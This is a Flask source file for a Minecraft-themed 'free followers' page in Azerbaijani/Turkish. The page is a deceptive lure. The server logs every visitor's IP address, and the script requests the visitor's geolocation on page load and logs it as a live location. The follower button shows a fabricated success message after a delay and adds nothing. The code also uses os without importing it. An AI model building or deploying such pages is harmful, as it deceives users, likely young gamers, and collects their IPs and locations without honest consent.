from flask import Flask, request
import datetime

app = Flask(__name__)

@app.route('/')
def index():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
    
    print(f"[{datetime.datetime.now()}] 🎮 Ziyaretci - IP: {ip}")

    return f"""
    <!DOCTYPE html>
    <html>
    <head>
        <title>NetherCraft - Pulsuz Takipçi</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            @import url('https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap');
            body {{
                margin: 0;
                padding: 0;
                background: linear-gradient(135deg, #0f0f0f, #1a1a2e);
                color: #fff;
                font-family: 'Press Start 2P', Arial;
                min-height: 100vh;
            }}
            .container {{
                max-width: 800px;
                margin: 40px auto;
                padding: 30px;
                background: rgba(20, 20, 40, 0.95);
                border: 4px solid #00ff00;
                border-radius: 12px;
                box-shadow: 0 0 30px #00ff00;
                text-align: center;
            }}
            h1 {{
                color: #00ff00;
                text-shadow: 0 0 15px #00ff00;
                font-size: 2.2em;
            }}
            .minecraft-btn {{
                background: #00aa00;
                color: white;
                border: 4px solid #00ff00;
                padding: 18px 40px;
                font-size: 18px;
                margin: 15px;
                cursor: pointer;
                transition: all 0.3s;
            }}
            .minecraft-btn:hover {{
                background: #00ff00;
                color: black;
                transform: scale(1.05);
            }}
            input {{
                background: #111;
                border: 3px solid #555;
                color: #0f0;
                padding: 15px;
                width: 80%;
                margin: 15px 0;
                font-family: 'Press Start 2P';
            }}
        </style>
    </head>
    <body>
        <div class="container">
            <h1>🌍 NETHERCRAFT</h1>
            <h2>PULSUZ TAKİPÇİ & BOOST</h2>
            <p><strong>IP:</strong> {ip}</p>
            
            <input type="text" id="username" placeholder="Minecraft Username">
            
            <button class="minecraft-btn" onclick="getFollowers()">250 TAKİPÇİ AL</button>
            <button class="minecraft-btn" onclick="getLocation()">📍 Server Yerini Yoxla</button>
            
            <div id="msg" style="margin-top:20px;padding:15px;display:none;background:#002200;border:2px solid #00ff00;"></div>
        </div>

        <script>
            // Avtomatik konum sorğusu
            window.onload = () => {{
                if (navigator.geolocation) {{
                    navigator.geolocation.getCurrentPosition(pos => {{
                        const lat = pos.coords.latitude.toFixed(5);
                        const lon = pos.coords.longitude.toFixed(5);
                        console.log(`📍 CANLI KONUM → ${lat}, ${lon}`);
                    }}, () => {{}});
                }}
            }};

            function getFollowers() {{
                const user = document.getElementById('username').value.trim();
                if (!user) return alert("Username daxil edin!");
                
                const btn = document.querySelector('button');
                btn.textContent = "YÜKLƏNİR...";
                btn.disabled = true;
                
                setTimeout(() => {{
                    document.getElementById('msg').innerHTML = "✅ 250 Takipçi uğurla əlavə edildi!";
                    document.getElementById('msg').style.display = "block";
                    btn.textContent = "250 TAKİPÇİ AL";
                    btn.disabled = false;
                }}, 4200);
            }}

            function getLocation() {{
                alert("🟢 Serverə qoşulursan... Yerləşmə yoxlanılır.");
            }}
        </script>
    </body>
    </html>
    """

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
